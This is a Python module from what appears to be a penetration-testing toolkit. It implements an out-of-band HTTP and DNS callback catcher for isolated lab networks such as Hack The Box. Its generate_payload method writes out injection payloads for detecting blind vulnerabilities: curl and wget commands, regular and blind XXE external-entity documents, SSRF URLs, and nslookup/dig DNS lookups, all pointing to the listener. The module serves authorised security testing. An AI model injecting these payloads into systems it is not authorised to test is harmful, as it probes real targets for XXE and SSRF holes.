"""Local OOB callback catcher — HTTP and DNS listeners for isolated networks.

Replaces webhook.site when the target network has no internet access (e.g. HTB).
Runs threaded HTTP and DNS listeners on a configurable interface, captures all
incoming requests, and stores them in thread-safe in-memory storage.
"""

import socket
import struct
import subprocess
import threading
import time
import uuid
from datetime import datetime, timezone
from http.server import HTTPServer, BaseHTTPRequestHandler
from typing import Any, Dict, List, Optional

from core.config import logger

_MAX_CALLBACKS = 1000


def _detect_tun0_ip() -> Optional[str]:
    """Return the IPv4 address assigned to tun0, or ``None``."""
    try:
        result = subprocess.run(
            ["ip", "-4", "addr", "show", "tun0"],
            capture_output=True,
            text=True,
            timeout=5,
        )
        if result.returncode == 0:
            import re
            match = re.search(r"inet (\d+\.\d+\.\d+\.\d+)", result.stdout)
            if match:
                return match.group(1)
    except Exception:
        pass
    return None


# ---------------------------------------------------------------------------
# DNS helpers — minimal RFC-1035 parser / builder
# ---------------------------------------------------------------------------

def _parse_dns_name(data: bytes, offset: int) -> tuple:
    """Parse a DNS domain name from *data* starting at *offset*.

    Returns ``(name_string, new_offset)``.
    """
    labels: List[str] = []
    jumped = False
    original_offset = offset
    max_jumps = 20
    jumps = 0

    while True:
        if offset >= len(data):
            break
        length = data[offset]
        if length == 0:
            offset += 1
            break
        if (length & 0xC0) == 0xC0:
            if not jumped:
                original_offset = offset + 2
            pointer = struct.unpack("!H", data[offset:offset + 2])[0] & 0x3FFF
            offset = pointer
            jumped = True
            jumps += 1
            if jumps > max_jumps:
                break
            continue
        offset += 1
        labels.append(data[offset:offset + length].decode("ascii", errors="replace"))
        offset += length

    name = ".".join(labels)
    return (name, original_offset if jumped else offset)


def _build_dns_response(query: bytes, response_ip: str) -> bytes:
    """Build a minimal DNS A-record response for *query*.

    Always responds with *response_ip* for any query.
    """
    if len(query) < 12:
        return b""

    txn_id = query[:2]
    flags = struct.pack("!H", 0x8180)  # standard response, no error
    qdcount = struct.pack("!H", 1)
    ancount = struct.pack("!H", 1)
    nscount = struct.pack("!H", 0)
    arcount = struct.pack("!H", 0)

    header = txn_id + flags + qdcount + ancount + nscount + arcount

    # Copy the question section verbatim
    _, qname_end = _parse_dns_name(query, 12)
    question = query[12:qname_end + 4]  # name + qtype(2) + qclass(2)

    # Answer section — pointer to name in question + A record
    answer_name = struct.pack("!H", 0xC00C)  # pointer to offset 12
    answer_type = struct.pack("!H", 1)       # A
    answer_class = struct.pack("!H", 1)      # IN
    answer_ttl = struct.pack("!I", 60)
    ip_parts = [int(p) for p in response_ip.split(".")]
    answer_rdata = struct.pack("!4B", *ip_parts)
    answer_rdlen = struct.pack("!H", 4)

    answer = answer_name + answer_type + answer_class + answer_ttl + answer_rdlen + answer_rdata

    return header + question + answer


# ---------------------------------------------------------------------------
# HTTP handler
# ---------------------------------------------------------------------------

class _CallbackHTTPHandler(BaseHTTPRequestHandler):
    """Captures every HTTP request and stores it on the parent catcher."""

    def _handle(self) -> None:
        content_length = int(self.headers.get("Content-Length", 0))
        body = ""
        if content_length > 0:
            raw = self.rfile.read(content_length)
            try:
                body = raw.decode("utf-8", errors="replace")
            except Exception:
                body = raw.hex()

        headers_dict = {k: v for k, v in self.headers.items()}
        from urllib.parse import urlparse, parse_qs
        parsed = urlparse(self.path)
        query_params = parse_qs(parsed.query)

        entry: Dict[str, Any] = {
            "id": str(uuid.uuid4())[:8],
            "type": "http",
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "method": self.command,
            "path": self.path,
            "source_ip": self.client_address[0],
            "source_port": self.client_address[1],
            "headers": headers_dict,
            "body": body,
            "query_params": query_params,
        }

        catcher: CallbackCatcher = self.server.catcher  # type: ignore[attr-defined]
        catcher._store_callback(entry)

        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.end_headers()
        self.wfile.write(b"OK\n")

    # Route every method through the same handler
    do_GET = _handle
    do_POST = _handle
    do_PUT = _handle
    do_DELETE = _handle
    do_PATCH = _handle
    do_HEAD = _handle
    do_OPTIONS = _handle

    def log_message(self, format: str, *args: Any) -> None:  # noqa: A002
        """Redirect default stderr logging to the application logger."""
        logger.debug("CallbackHTTP: %s", format % args)


# ---------------------------------------------------------------------------
# DNS listener thread
# ---------------------------------------------------------------------------

class _DNSListener:
    """A simple threaded UDP DNS server that captures queries."""

    def __init__(self, catcher: "CallbackCatcher", bind_ip: str, port: int, response_ip: str):
        self._catcher = catcher
        self._bind_ip = bind_ip
        self._port = port
        self._response_ip = response_ip
        self._sock: Optional[socket.socket] = None
        self._thread: Optional[threading.Thread] = None
        self._running = False

    def start(self) -> None:
        """Bind the UDP socket and start the listener thread."""
        self._sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self._sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self._sock.settimeout(1.0)
        self._sock.bind((self._bind_ip, self._port))
        self._running = True
        self._thread = threading.Thread(target=self._serve, daemon=True, name="dns-listener")
        self._thread.start()
        logger.info("DNS listener started on %s:%d", self._bind_ip, self._port)

    def stop(self) -> None:
        """Stop the listener and close the socket."""
        self._running = False
        if self._thread and self._thread.is_alive():
            self._thread.join(timeout=5)
        if self._sock:
            try:
                self._sock.close()
            except Exception:
                pass
            self._sock = None
        logger.info("DNS listener stopped")

    def _serve(self) -> None:
        while self._running:
            try:
                data, addr = self._sock.recvfrom(512)  # type: ignore[union-attr]
            except socket.timeout:
                continue
            except OSError:
                if self._running:
                    logger.warning("DNS socket error — stopping listener")
                break

            query_name = ""
            query_type_str = "A"
            try:
                if len(data) >= 12:
                    query_name, qname_end = _parse_dns_name(data, 12)
                    if qname_end + 2 <= len(data):
                        qtype_raw = struct.unpack("!H", data[qname_end:qname_end + 2])[0]
                        _qtypes = {1: "A", 28: "AAAA", 5: "CNAME", 15: "MX", 2: "NS", 16: "TXT", 6: "SOA", 12: "PTR"}
                        query_type_str = _qtypes.get(qtype_raw, str(qtype_raw))
            except Exception as exc:
                logger.debug("DNS parse error: %s", exc)

            entry: Dict[str, Any] = {
                "id": str(uuid.uuid4())[:8],
                "type": "dns",
                "timestamp": datetime.now(timezone.utc).isoformat(),
                "query_name": query_name,
                "query_type": query_type_str,
                "source_ip": addr[0],
                "source_port": addr[1],
            }
            self._catcher._store_callback(entry)

            # Respond with an A record pointing to our listener IP
            try:
                response = _build_dns_response(data, self._response_ip)
                if response:
                    self._sock.sendto(response, addr)  # type: ignore[union-attr]
            except Exception as exc:
                logger.debug("DNS response send error: %s", exc)


# ---------------------------------------------------------------------------
# CallbackCatcher — main class (singleton)
# ---------------------------------------------------------------------------

_instance_lock = threading.Lock()
_instance: Optional["CallbackCatcher"] = None


class CallbackCatcher:
    """In-process HTTP + DNS callback catcher.

    Only one instance is allowed at a time (singleton).
    """

    def __init__(self) -> None:
        self._callbacks: List[Dict[str, Any]] = []
        self._lock = threading.Lock()
        self._max_size = _MAX_CALLBACKS
        self._http_server: Optional[HTTPServer] = None
        self._http_thread: Optional[threading.Thread] = None
        self._dns_listener: Optional[_DNSListener] = None
        self._running = False
        self._http_port = 0
        self._dns_port = 0
        self._bind_ip = "0.0.0.0"

    # -- storage ----------------------------------------------------------

    def _store_callback(self, entry: Dict[str, Any]) -> None:
        """Thread-safe append to the callback list."""
        with self._lock:
            self._callbacks.append(entry)
            if len(self._callbacks) > self._max_size:
                self._callbacks = self._callbacks[-self._max_size:]
        logger.info(
            "Callback captured: type=%s source=%s path/query=%s",
            entry.get("type"),
            entry.get("source_ip"),
            entry.get("path") or entry.get("query_name"),
        )

    # -- lifecycle --------------------------------------------------------

    def start(self, http_port: int = 8888, dns_port: int = 5353, bind_ip: str = "0.0.0.0") -> Dict[str, Any]:
        """Start the HTTP and DNS listeners.

        Args:
            http_port: TCP port for the HTTP listener.
            dns_port:  UDP port for the DNS listener.
            bind_ip:   IP/interface to bind to (default ``0.0.0.0``).

        Returns:
            Status dict with listener details.
        """
        if self._running:
            return {
                "success": False,
                "error": "Callback catcher is already running",
                "http_port": self._http_port,
                "dns_port": self._dns_port,
                "bind_ip": self._bind_ip,
            }

        self._bind_ip = bind_ip
        self._http_port = http_port
        self._dns_port = dns_port

        tun0_ip = _detect_tun0_ip()
        response_ip = tun0_ip if tun0_ip else (bind_ip if bind_ip != "0.0.0.0" else "127.0.0.1")

        errors: List[str] = []

        # Start HTTP listener
        try:
            self._http_server = HTTPServer((bind_ip, http_port), _CallbackHTTPHandler)
            self._http_server.catcher = self  # type: ignore[attr-defined]
            self._http_thread = threading.Thread(
                target=self._http_server.serve_forever,
                daemon=True,
                name="http-callback-listener",
            )
            self._http_thread.start()
            logger.info("HTTP callback listener started on %s:%d", bind_ip, http_port)
        except Exception as exc:
            errors.append(f"HTTP listener failed: {exc}")
            logger.error("Failed to start HTTP listener: %s", exc)

        # Start DNS listener
        try:
            self._dns_listener = _DNSListener(self, bind_ip, dns_port, response_ip)
            self._dns_listener.start()
        except Exception as exc:
            errors.append(f"DNS listener failed: {exc}")
            logger.error("Failed to start DNS listener: %s", exc)

        self._running = True

        return {
            "success": len(errors) == 0,
            "http_port": http_port,
            "dns_port": dns_port,
            "bind_ip": bind_ip,
            "tun0_ip": tun0_ip,
            "response_ip": response_ip,
            "errors": errors if errors else None,
            "message": (
                f"Callback catcher running — HTTP on {bind_ip}:{http_port}, "
                f"DNS on {bind_ip}:{dns_port}"
            ),
        }

    def stop(self) -> Dict[str, Any]:
        """Stop all listeners and clean up threads.

        Returns:
            Status dict confirming shutdown.
        """
        if not self._running:
            return {"success": True, "message": "Callback catcher was not running"}

        if self._http_server:
            self._http_server.shutdown()
            if self._http_thread and self._http_thread.is_alive():
                self._http_thread.join(timeout=5)
            self._http_server.server_close()
            self._http_server = None
            self._http_thread = None

        if self._dns_listener:
            self._dns_listener.stop()
            self._dns_listener = None

        self._running = False
        captured = len(self._callbacks)
        logger.info("Callback catcher stopped. %d callbacks captured.", captured)
        return {
            "success": True,
            "message": f"Callback catcher stopped. {captured} callbacks in memory.",
            "callbacks_captured": captured,
        }

    def status(self) -> Dict[str, Any]:
        """Return current status of the catcher.

        Returns:
            Dict with running state, ports, and callback counts.
        """
        with self._lock:
            total = len(self._callbacks)
            http_count = sum(1 for c in self._callbacks if c["type"] == "http")
            dns_count = sum(1 for c in self._callbacks if c["type"] == "dns")

        return {
            "running": self._running,
            "http_port": self._http_port if self._running else None,
            "dns_port": self._dns_port if self._running else None,
            "bind_ip": self._bind_ip if self._running else None,
            "tun0_ip": _detect_tun0_ip(),
            "callbacks_total": total,
            "callbacks_http": http_count,
            "callbacks_dns": dns_count,
            "max_storage": self._max_size,
        }

    # -- query ------------------------------------------------------------

    def get_callbacks(self, limit: int = 50, callback_type: str = "all") -> List[Dict[str, Any]]:
        """Return captured callbacks, newest first.

        Args:
            limit:         Maximum number of entries to return.
            callback_type: ``"all"``, ``"http"``, or ``"dns"``.

        Returns:
            List of callback dicts.
        """
        with self._lock:
            items = list(self._callbacks)

        if callback_type in ("http", "dns"):
            items = [c for c in items if c["type"] == callback_type]

        items.reverse()
        return items[:limit]

    def get_latest(self) -> Dict[str, Any]:
        """Return the most recent callback entry.

        Returns:
            The latest callback dict, or a message if none exist.
        """
        with self._lock:
            if not self._callbacks:
                return {"message": "No callbacks captured yet"}
            return dict(self._callbacks[-1])

    def clear(self) -> Dict[str, Any]:
        """Clear all captured callbacks from memory.

        Returns:
            Confirmation dict with the count of cleared entries.
        """
        with self._lock:
            count = len(self._callbacks)
            self._callbacks.clear()
        logger.info("Cleared %d callbacks", count)
        return {"success": True, "cleared": count}

    def check_for_callbacks(self, identifier: str = "", since_minutes: int = 60) -> Dict[str, Any]:
        """Check for callbacks matching an identifier substring.

        Searches HTTP paths and DNS query names for *identifier*.

        Args:
            identifier:    Substring to match against path or query_name.
            since_minutes: Only consider callbacks from the last N minutes.

        Returns:
            Dict with match status, count, and matching entries.
        """
        cutoff = datetime.now(timezone.utc).timestamp() - (since_minutes * 60)

        with self._lock:
            items = list(self._callbacks)

        matches: List[Dict[str, Any]] = []
        for cb in items:
            try:
                ts = datetime.fromisoformat(cb["timestamp"]).timestamp()
            except (ValueError, KeyError):
                ts = 0
            if ts < cutoff:
                continue
            if identifier:
                haystack = cb.get("path", "") + cb.get("query_name", "")
                if identifier.lower() not in haystack.lower():
                    continue
            matches.append(cb)

        return {
            "found": len(matches) > 0,
            "count": len(matches),
            "identifier": identifier or "(any)",
            "since_minutes": since_minutes,
            "callbacks": matches[-50:],
        }

    # -- payload generation -----------------------------------------------

    @staticmethod
    def generate_payload(
        listener_ip: str,
        http_port: int = 8888,
        dns_port: int = 5353,
        payload_type: str = "url",
    ) -> Dict[str, Any]:
        """Generate callback payload URLs / commands for injection testing.

        Args:
            listener_ip:  IP of the callback listener.
            http_port:    HTTP listener port.
            dns_port:     DNS listener port.
            payload_type: One of ``url``, ``curl``, ``xxe``, ``ssrf``, ``dns``, ``all``.

        Returns:
            Dict containing the requested payload(s).
        """
        tag = str(uuid.uuid4())[:8]
        base_url = f"http://{listener_ip}:{http_port}"
        callback_url = f"{base_url}/cb/{tag}"

        payloads: Dict[str, Any] = {}

        generators = {
            "url": lambda: {
                "callback_url": callback_url,
                "identifier": tag,
            },
            "curl": lambda: {
                "command": f"curl -s {callback_url}",
                "wget": f"wget -q -O- {callback_url}",
                "identifier": tag,
            },
            "xxe": lambda: {
                "payload": (
                    f'<?xml version="1.0"?>\n'
                    f'<!DOCTYPE foo [\n'
                    f'  <!ENTITY xxe SYSTEM "{callback_url}">\n'
                    f']>\n'
                    f'<foo>&xxe;</foo>'
                ),
                "blind_payload": (
                    f'<?xml version="1.0"?>\n'
                    f'<!DOCTYPE foo [\n'
                    f'  <!ENTITY % xxe SYSTEM "{callback_url}">\n'
                    f'  %xxe;\n'
                    f']>\n'
                    f'<foo>test</foo>'
                ),
                "identifier": tag,
            },
            "ssrf": lambda: {
                "urls": [
                    callback_url,
                    f"http://{listener_ip}:{http_port}/ssrf/{tag}",
                    f"http://{listener_ip}:{http_port}/?url=ssrf-{tag}",
                ],
                "identifier": tag,
            },
            "dns": lambda: {
                "nslookup": f"nslookup {tag}.test {listener_ip} -port={dns_port}",
                "dig": f"dig @{listener_ip} -p {dns_port} {tag}.test",
                "host": f"host {tag}.test {listener_ip}",
                "identifier": tag,
            },
        }

        if payload_type == "all":
            for name, gen in generators.items():
                payloads[name] = gen()
        elif payload_type in generators:
            payloads[payload_type] = generators[payload_type]()
        else:
            return {"error": f"Unknown payload_type '{payload_type}'. Use: url, curl, xxe, ssrf, dns, all"}

        return {
            "success": True,
            "listener_ip": listener_ip,
            "http_port": http_port,
            "dns_port": dns_port,
            "payload_type": payload_type,
            "payloads": payloads,
        }


# ---------------------------------------------------------------------------
# Singleton accessor
# ---------------------------------------------------------------------------

def get_instance() -> CallbackCatcher:
    """Return the global singleton :class:`CallbackCatcher` instance."""
    global _instance
    with _instance_lock:
        if _instance is None:
            _instance = CallbackCatcher()
        return _instance
